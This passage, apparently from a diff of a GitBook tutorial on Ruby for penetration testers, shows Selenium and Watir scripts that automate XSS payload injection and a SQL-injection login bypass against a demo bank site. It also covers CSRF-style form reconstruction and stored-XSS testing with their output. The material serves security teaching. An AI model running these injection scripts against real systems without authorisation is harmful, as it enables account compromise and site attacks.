+input[<span class="hljs-number">0</span>].send_keys(<span class="hljs-string">&quot;&apos; or 1=1;--&quot;</span>)   <span class="hljs-comment"># Send key for the 1st element </span>
+input[<span class="hljs-number">1</span>].send_keys(<span class="hljs-string">&quot;password&quot;</span>)      <span class="hljs-comment"># Send key fro the next element</span>
+sleep <span class="hljs-number">1</span>
+
+<span class="hljs-comment"># Click/submit the button based the form it is in (you can also call &apos;btnSubmit&apos; method)</span>
+submit = browser.find_element(<span class="hljs-symbol">:name</span>, <span class="hljs-string">&quot;btnSubmit&quot;</span>).click <span class="hljs-comment">#.submit</span>
+
+<span class="hljs-comment"># browser.quit</span>
+</code></pre>
+<p>Let&apos;s test the page against XSS vulnerability. First I&apos;ll list what kind of action we need from browser</p>
+<ol>
+<li>Open a browser window (Firefox)</li>
+<li>Navigate to a URL (altoromutual.com)</li>
+<li>Perform some operations (Send an XSS payload)</li>
+<li>Check if the payload is working(Popping-up) or it&apos;s a false positive </li>
+<li>Print the succeed payloads on terminal</li>
+</ol>
+<p><strong>selenium-xss.rb</strong></p>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;selenium-webdriver&apos;</span>
+
+payloads = 
+  [ 
+    <span class="hljs-string">&quot;&lt;video src=x onerror=alert(1);&gt;&quot;</span>,
+    <span class="hljs-string">&quot;&lt;img src=x onerror=&apos;alert(2)&apos;&gt;&quot;</span>,
+    <span class="hljs-string">&quot;&lt;script&gt;alert(3)&lt;/script&gt;&quot;</span>,
+    <span class="hljs-string">&quot;&lt;svg/OnlOad=prompt(4)&gt;&quot;</span>,
+    <span class="hljs-string">&quot;javascript:alert(5)&quot;</span>,
+    <span class="hljs-string">&quot;alert(/6/.source)&quot;</span>
+  ]
+
+browser = <span class="hljs-constant">Selenium::WebDriver</span>.<span class="hljs-keyword">for</span> <span class="hljs-symbol">:firefox</span>                  <span class="hljs-comment"># You can use :ff too</span>
+browser.manage.window.resize_to(<span class="hljs-number">500</span>, <span class="hljs-number">400</span>)                   <span class="hljs-comment"># Set browser size</span>
+browser.get <span class="hljs-string">&quot;http://www.altoromutual.com/search.aspx?&quot;</span>
+
+wait = <span class="hljs-constant">Selenium::WebDriver::Wait</span>.new(<span class="hljs-symbol">:timeout</span> =&gt; <span class="hljs-number">10</span>)        <span class="hljs-comment"># Timeout to wait </span>
+
+payloads.each <span class="hljs-keyword">do</span> |payload|
+  input = wait.<span class="hljs-keyword">until</span> <span class="hljs-keyword">do</span>
+      element = browser.find_element(<span class="hljs-symbol">:name</span>, <span class="hljs-string">&apos;txtSearch&apos;</span>)
+      element <span class="hljs-keyword">if</span> element.displayed?
+  <span class="hljs-keyword">end</span>
+  input.send_keys(payload)
+  input.submit
+
+  <span class="hljs-keyword">begin</span> 
+    wait.<span class="hljs-keyword">until</span> <span class="hljs-keyword">do</span> 
+      txt = browser.switch_to.alert
+      <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span>..<span class="hljs-number">100</span>) === txt.text.to_i
+        puts <span class="hljs-string">&quot;Payload is working: <span class="hljs-subst">#{payload}</span>&quot;</span>
+        txt.accept 
+      <span class="hljs-keyword">end</span>
+    <span class="hljs-keyword">end</span>
+  <span class="hljs-keyword">rescue</span> <span class="hljs-constant">Selenium::WebDriver::Error::NoAlertOpenError</span>
+    puts <span class="hljs-string">&quot;False Positive: <span class="hljs-subst">#{payload}</span>&quot;</span>
+    <span class="hljs-keyword">next</span>
+  <span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">end</span>
+
+browser.close
+</code></pre>
+<p>Result</p>
+<pre><code>&gt; ruby selenium-xss.rb
+Payload is working: &lt;video src=x onerror=alert(1);&gt;
+Payload is working: &lt;img src=x onerror=&apos;alert(2)&apos;&gt;
+Payload is working: &lt;script&gt;alert(3)&lt;/script&gt;
+Payload is working: &lt;svg/OnlOad=prompt(4)&gt;
+False Positive: javascript:alert(5)
+False Positive: alert(/6/.source)
+</code></pre><h2 id="watir-webdriver"><a name="watir-webdriver" class="plugin-anchor" href="#watir-webdriver"><span class="fa fa-link"></span></a>Watir Webdriver</h2>
+<p><a href="http://watirwebdriver.com/" target="_blank"><strong>Watir</strong></a> is abbreviation for (Web Application Testing in Ruby). I believe that Watir is more elegant than Selenium but I like to know many ways to do the same thing, just in case. </p>
+<ul>
+<li>To install watir gem<pre><code>gem install watir-webdriver
+</code></pre></li>
+</ul>
+<h3 id="get-request"><a name="get-request" class="plugin-anchor" href="#get-request"><span class="fa fa-link"></span></a>GET Request</h3>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;watir-webdriver&apos;</span>
+
+browser = <span class="hljs-constant">Watir::Browser</span>.new <span class="hljs-symbol">:firefox</span>
+browser.goto <span class="hljs-string">&quot;http://www.altoromutual.com/search.aspx?&quot;</span>
+browser.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;txtSearch&apos;</span>).set(<span class="hljs-string">&quot;&lt;img src=x onerror=&apos;alert(1)&apos;&gt;&quot;</span>)
+btn = browser.button(<span class="hljs-symbol">value:</span> <span class="hljs-string">&apos;Go&apos;</span>)
+puts btn.exists?
+btn.click
+
+<span class="hljs-comment"># browser.close</span>
+</code></pre>
+<p>Sometime you&apos;ll need to send XSS GET request from URL like <code>http://app/search?q=&lt;script&gt;alert&lt;/script&gt;</code>. You&apos;ll face a known error <code>Selenium::WebDriver::Error::UnhandledAlertError: Unexpected modal dialog</code> if the alert box popped up but it you do refresh page for the sent payload it&apos;ll work so the fix for this issue is the following.</p>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;watir-webdriver&apos;</span>
+
+browser = <span class="hljs-constant">Watir::Browser</span>.new <span class="hljs-symbol">:firefox</span>
+wait = <span class="hljs-constant">Selenium::WebDriver::Wait</span>.new(<span class="hljs-symbol">:timeout</span> =&gt; <span class="hljs-number">15</span>)
+
+<span class="hljs-keyword">begin</span> 
+    browser.goto(<span class="hljs-string">&quot;http://www.altoromutual.com/search.aspx?txtSearch=&lt;img src=x onerror=alert(1)&gt;&quot;</span>)
+<span class="hljs-keyword">rescue</span> <span class="hljs-constant">Selenium::WebDriver::Error::UnhandledAlertError</span>
+    browser.refresh
+    wait.<span class="hljs-keyword">until</span> {browser.alert.exists?}
+<span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">if</span> browser.alert.exists? 
+  browser.alert.ok
+  puts <span class="hljs-string">&quot;[+] Exploit found!&quot;</span>
+  browser.close
+<span class="hljs-keyword">end</span>
+</code></pre>
+<h3 id="post-request"><a name="post-request" class="plugin-anchor" href="#post-request"><span class="fa fa-link"></span></a>POST Request</h3>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;watir-webdriver&apos;</span>
+
+browser = <span class="hljs-constant">Watir::Browser</span>.new <span class="hljs-symbol">:firefox</span>
+browser.window.resize_to(<span class="hljs-number">800</span>, <span class="hljs-number">600</span>)
+browser.window.move_to(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+browser.goto <span class="hljs-string">&quot;http://www.altoromutual.com/bank/login.aspx&quot;</span>
+browser.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;uid&apos;</span>).set(<span class="hljs-string">&quot;&apos; or 1=1;-- &quot;</span>)
+browser.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;passw&apos;</span>).set(<span class="hljs-string">&quot;password&quot;</span>)
+btn = browser.button(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;btnSubmit&apos;</span>).click 
+
+<span class="hljs-comment"># browser.close</span>
+</code></pre>
+<blockquote>
+<ul>
+<li>Since Waiter is integrated with Selenium, you can use both to achieve one goal </li>
+<li>For Some reason in some log-in cases, you may need to add a delay time between entering username and password then submit.</li>
+</ul>
+</blockquote>
+<h2 id="selenium-watir-arbitrary-post-request"><a name="selenium-watir-arbitrary-post-request" class="plugin-anchor" href="#selenium-watir-arbitrary-post-request"><span class="fa fa-link"></span></a>Selenium, Watir Arbitrary POST request</h2>
+<p>Here another scenario I&apos;ve faced, I was against POST request without submit button, in another word, the test was against intercepted request generated from jQuery function, in my case was a drop menu. So The work round wad quite simple, Just create an HTML file contains POST form with the original parameters plus a <strong>Submit button</strong>(<strong><em>just like creating CSRF exploit from a POST form</em></strong>) then call that html file to the browser and deal with it as normal form. Let&apos;s to see an example here.</p>
+<p><strong>POST request</strong></p>
+<pre><code>POST /path/of/editfunction HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 100
+Cookie: PHPSESSIONID=111111111111111111111
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+field1=&quot;&quot;&amp;field2=&quot;&quot;&amp;field3=&quot;&quot;&amp;field4=&quot;&quot;
+</code></pre><p><strong>example.html</strong></p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>Victim Site - POST request<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">&quot;https://example.com/path/of/editfunction&quot;</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">&quot;POST&quot;</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">&quot;text&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">&quot;field1&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">&quot;&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">&quot;text&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">&quot;field2&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">&quot;&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">&quot;text&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">&quot;field3&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">&quot;&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">&quot;text&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">&quot;field4&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">&quot;&quot;</span> /&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-title">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">&quot;submit&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">&quot;Send&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span>
+  <span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span>
+</code></pre>
+<p><strong>exploit.rb</strong></p>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;watir-webdriver&apos;</span>
+
+<span class="hljs-variable">@browser</span> = <span class="hljs-constant">Watir::Browser</span>.new <span class="hljs-symbol">:firefox</span>
+<span class="hljs-variable">@browser</span>.window.resize_to(<span class="hljs-number">800</span>, <span class="hljs-number">600</span>)     <span class="hljs-comment"># Set browser size</span>
+<span class="hljs-variable">@browser</span>.window.move_to(<span class="hljs-number">400</span>, <span class="hljs-number">300</span>)       <span class="hljs-comment"># Allocate browser position </span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendpost</span><span class="hljs-params">(payload)</span></span>
+  <span class="hljs-variable">@browser</span>.goto <span class="hljs-string">&quot;file:///home/KING/Code/example.html&quot;</span>
+
+  <span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;field1&apos;</span>).set(payload)
+  <span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;field2&apos;</span>).set(payload)
+  <span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;field3&apos;</span>).set(payload)
+  <span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;field4&apos;</span>).set(payload)
+  sleep <span class="hljs-number">0</span>.<span class="hljs-number">1</span>
+  <span class="hljs-variable">@browser</span>.button(<span class="hljs-symbol">value:</span> <span class="hljs-string">&apos;Send&apos;</span>).click
+<span class="hljs-keyword">end</span>
+
+payloads = 
+    [
+      <span class="hljs-string">&apos;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&apos;</span>,
+      <span class="hljs-string">&apos;&lt;img src=x onerror=alert(2)&gt;&apos;</span>
+    ]
+
+puts <span class="hljs-string">&quot;[*] Exploitation start&quot;</span>
+puts <span class="hljs-string">&quot;[*] Number of payloads: <span class="hljs-subst">#{payloads.size}</span> payloads&quot;</span> 
+payloads.each <span class="hljs-keyword">do</span> |payload|
+  print <span class="hljs-string">&quot;\r[*] Trying: <span class="hljs-subst">#{payload}</span>&quot;</span>
+  print <span class="hljs-string">&quot;\e[K&quot;</span>
+  sendpost payload
+
+  <span class="hljs-keyword">if</span> <span class="hljs-variable">@browser</span>.alert.exists?
+    <span class="hljs-variable">@browser</span>.alert.ok
+    puts <span class="hljs-string">&quot;[+] Exploit found!: &quot;</span> + payload
+    <span class="hljs-variable">@browser</span>.close
+  <span class="hljs-keyword">end</span> 
+<span class="hljs-keyword">end</span>
+</code></pre>
+<h3 id="dealing-with-tabs"><a name="dealing-with-tabs" class="plugin-anchor" href="#dealing-with-tabs"><span class="fa fa-link"></span></a>Dealing with tabs</h3>
+<p>One of scenarios I&apos;ve faced is to exploit XSS a user profile fields and check the result in another page which present the public user&apos;s profile. Instead of revisiting the URLs again and again I open new tab and refresh the public user&apos;s profile page then return back to send the exploit and so on.</p>
+<p><strong>xss_tab.rb</strong></p>
+<pre><code class="lang-ruby"><span class="hljs-comment">#!/usr/bin/env ruby</span>
+<span class="hljs-comment"># KING SABRI | <span class="hljs-doctag">@KINGSABRI</span></span>
+<span class="hljs-comment">#</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;watir-webdriver&apos;</span>
+<span class="hljs-keyword">require</span> <span class="hljs-string">&apos;uri&apos;</span>
+
+<span class="hljs-variable">@url</span> = <span class="hljs-constant">URI</span>.parse <span class="hljs-string">&quot;http://example.com/Users/User_Edit.aspx?userid=68&quot;</span>
+
+<span class="hljs-variable">@browser</span> = <span class="hljs-constant">Watir::Browser</span>.new <span class="hljs-symbol">:firefox</span>
+<span class="hljs-variable">@browser</span>.window.resize_to(<span class="hljs-number">800</span>, <span class="hljs-number">600</span>)
+<span class="hljs-comment"># <span class="hljs-doctag">@browser</span>.window.move_to(540, 165)</span>
+<span class="hljs-variable">@wait</span> = <span class="hljs-constant">Selenium::WebDriver::Wait</span>.new(<span class="hljs-symbol">:timeout</span> =&gt; <span class="hljs-number">10</span>)
+
+<span class="hljs-variable">@browser</span>.goto <span class="hljs-string">&quot;http://example.com/logon.aspx&quot;</span>
+
+<span class="hljs-comment"># Login </span>
+<span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;Login1$UserName&apos;</span>).set(<span class="hljs-string">&quot;admin&quot;</span>)
+<span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;Login1$Password&apos;</span>).set(<span class="hljs-string">&quot;P@ssword&quot;</span>)
+sleep <span class="hljs-number">0</span>.<span class="hljs-number">5</span>
+<span class="hljs-variable">@browser</span>.button(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;Login1$LoginButton&apos;</span>).click 
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendpost</span><span class="hljs-params">(payload)</span></span>
+  <span class="hljs-keyword">begin</span> 
+
+    <span class="hljs-variable">@browser</span>.switch                                                             <span class="hljs-comment"># Make sure to focus on current tab/window</span>
+    <span class="hljs-variable">@browser</span>.goto <span class="hljs-string">&quot;<span class="hljs-subst">#{<span class="hljs-variable">@url</span>.scheme}</span>://<span class="hljs-subst">#{<span class="hljs-variable">@url</span>.host}</span>/<span class="hljs-subst">#{<span class="hljs-variable">@url</span>.path}</span>?<span class="hljs-subst">#{<span class="hljs-variable">@url</span>.query}</span>&quot;</span>    <span class="hljs-comment"># Goto the URL</span>
+    <span class="hljs-variable">@wait</span>.<span class="hljs-keyword">until</span> {<span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">id:</span> <span class="hljs-string">&apos;txtFullName&apos;</span>).exists?}                <span class="hljs-comment"># Wait until wanted text area appear </span>
+    <span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">id:</span> <span class="hljs-string">&apos;txtFullName&apos;</span>).set(payload)                         <span class="hljs-comment"># Set payload to the text area</span>
+    <span class="hljs-variable">@browser</span>.text_field(<span class="hljs-symbol">id:</span> <span class="hljs-string">&apos;txtFirstName&apos;</span>).set(payload)                        <span class="hljs-comment"># Set payload to the text area</span>
+    <span class="hljs-variable">@browser</span>.button(<span class="hljs-symbol">name:</span> <span class="hljs-string">&apos;$actionsElem$save&apos;</span>).click                            <span class="hljs-comment"># Click Save button </span>
+
+  <span class="hljs-keyword">rescue</span> <span class="hljs-constant">Selenium::WebDriver::Error::UnhandledAlertError</span>
+    <span class="hljs-variable">@browser</span>.refresh                            <span class="hljs-comment"># Refresh the current page</span>
+    <span class="hljs-variable">@wait</span>.<span class="hljs-keyword">until</span> {<span class="hljs-variable">@browser</span>.alert.exists?}        <span class="hljs-comment"># Check if alert box appear</span>
+  <span class="hljs-keyword">end</span>
+<span class="hljs-keyword">end</span>
+
+payloads = 
+  [ 
+    <span class="hljs-string">&quot;\&quot;&gt;&lt;video src=x onerror=alert(1);&gt;&quot;</span>,
+    <span class="hljs-string">&quot;&lt;img src=x onerror=&apos;alert(2)&apos;&gt;&quot;</span>,
+    <span class="hljs-string">&quot;&lt;script&gt;alert(3)&lt;/script&gt;&quot;</span>,
+    <span class="hljs-string">&quot;&lt;svg/OnlOad=prompt(4)&gt;&quot;</span>,
+    <span class="hljs-string">&quot;javascript:alert(5)&quot;</span>,
+    <span class="hljs-string">&quot;alert(/6/.source)&quot;</span>
+  ]
+
+puts <span class="hljs-string">&quot;[*] Exploitation start&quot;</span>
+puts <span class="hljs-string">&quot;[*] Number of payloads: <span class="hljs-subst">#{payloads.size}</span> payloads&quot;</span> 
+
+<span class="hljs-variable">@browser</span>.send_keys(<span class="hljs-symbol">:control</span>, <span class="hljs-string">&apos;t&apos;</span>)                               <span class="hljs-comment"># Sent Ctrl+T to open new tab</span>
+<span class="hljs-variable">@browser</span>.goto <span class="hljs-string">&quot;http://example.com/pub_prof/user/silver.aspx&quot;</span>    <span class="hljs-comment"># Goto the use&apos;s public profile</span>
+<span class="hljs-variable">@browser</span>.switch                                                 <span class="hljs-comment"># Make sure to focus on current tab/window</span>
+
+payloads.each <span class="hljs-keyword">do</span> |payload|
+
+  <span class="hljs-variable">@browser</span>.send_keys(<span class="hljs-symbol">:alt</span>, <span class="hljs-string">&apos;1&apos;</span>)                                     <span class="hljs-comment"># Send Alt+1 to go to first tab</span>
+  sendpost payload
+  puts <span class="hljs-string">&quot;[*] Sending to &apos;<span class="hljs-subst">#{<span class="hljs-variable">@browser</span>.title}</span>&apos; Payload : <span class="hljs-subst">#{payload}</span>&quot;</span>
+  <span class="hljs-variable">@browser</span>.send_keys(<span class="hljs-symbol">:alt</span>, <span class="hljs-string">&apos;2&apos;</span>)                                     <span class="hljs-comment"># Send Alt+2 to go to second tab</span>
+  <span class="hljs-variable">@browser</span>.switch 
+  <span class="hljs-variable">@browser</span>.refresh
+  puts <span class="hljs-string">&quot;[*] Checking Payload Result on <span class="hljs-subst">#{<span class="hljs-variable">@browser</span>.title}</span>&quot;</span>
+
+  <span class="hljs-keyword">if</span> <span class="hljs-variable">@browser</span>.alert.exists? 
+    <span class="hljs-variable">@browser</span>.alert.ok
+    puts 
+    puts <span class="hljs-string">&quot;[+] Exploit found!: &quot;</span> + payload
+    <span class="hljs-variable">@browser</span>.close
+    exit <span class="hljs-number">0</span>
+  <span class="hljs-keyword">end</span>
+
+<span class="hljs-keyword">end</span> 
+
+<span class="hljs-variable">@browser</span>.close
+puts
+</code></pre>
+<h2 id=""><a name="" class="plugin-anchor" href="#"><span class="fa fa-link"></span></a><br><br><br></h2>
+<ul>
+<li><a href="http://docs.seleniumhq.org/docs/" target="_blank">Selenium official documentations</a></li>
+<li><a href="https://gist.github.com/kenrett/7553278" target="_blank">Selenium Cheat Sheet</a> </li>
+<li><a href="http://watirmelon.com/2011/05/05/selenium-webdriver-vs-watir-webdriver-in-ruby/" target="_blank">Selenium webdriver vs Watir-webdriver in Ruby</a></li>
+<li><a href="https://www.browserstack.com/automate/ruby" target="_blank">Writing automate test scripts in Ruby</a></li>
+<li><a href="https://swdandruby.wordpress.com/" target="_blank">Selenium WebDriver and Ruby</a></li>
+<li><a href="https://seleniumguidebook.com/" target="_blank">The Selenium Guidebook - Commercial </a></li>
+<li><a href="http://watirwebdriver.com/" target="_blank">Watir WebDriver</a></li>
+<li><a href="https://github.com/watir/watir/wiki/Cheat-Sheet" target="_blank">Watir Cheat Sheet</a></li>
+</ul>
+
+                    
+                    </section>
+                
+                
+                </div>
+            </div>
+        </div>
+
+        
+        <a href="../module_0x4__web_kung_fu/extending_burpsuite.html" class="navigation navigation-prev " aria-label="Previous page: Extending Burp Suite"><i class="fa fa-angle-left"></i></a>
+        
+        
+        <a href="../module_0x4__web_kung_fu/web_servcies_and_apis.html" class="navigation navigation-next " aria-label="Next page: Web Services and APIs"><i class="fa fa-angle-right"></i></a>
+        
+    </div>
+</div>
+
+        
+<script src="../gitbook/app.js"></script>
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-splitter/splitter.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-book-summary-scroll-position-saver/book-summary-scroll-position-saver.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-search/lunr.min.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-search/search.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-sharing/buttons.js"></script>
+    
+
+    
+    <script src="../gitbook/plugins/gitbook-plugin-fontsettings/buttons.js"></script>
+    
+
+<script>
+require(["gitbook"], function(gitbook) {
+    var config = {"addcssjs":{"js":["styles/header.js"]},"anchors":{},"todo":{},"splitter":{},"book-summary-scroll-position-saver":{},"expandable-chapters":{},"highlight":{},"search":{"maxIndexSize":1000000},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2}};
+    gitbook.start(config);
+});
+</script>
+
+        
+    </body>
+    
+</html>
